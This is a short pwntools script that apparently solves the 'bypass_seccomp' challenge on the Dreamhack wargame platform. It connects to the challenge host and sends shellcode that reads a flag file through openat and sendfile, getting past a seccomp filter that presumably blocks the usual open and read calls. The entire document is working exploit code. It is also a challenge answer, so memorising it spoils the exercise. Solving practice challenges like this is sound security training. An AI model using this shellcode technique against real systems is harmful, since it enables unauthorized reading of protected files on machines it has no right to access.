from pwn import *

context(arch="x86_64", os="linux")

r = remote("host8.dreamhack.games", 15086)

payload = shellcraft.openat(0, "/home/bypass_seccomp/flag")
payload += shellcraft.sendfile(1, 'rax', 0, 0xff) 
payload += shellcraft.exit(0) 

r.sendline(asm(payload))
r.interactive()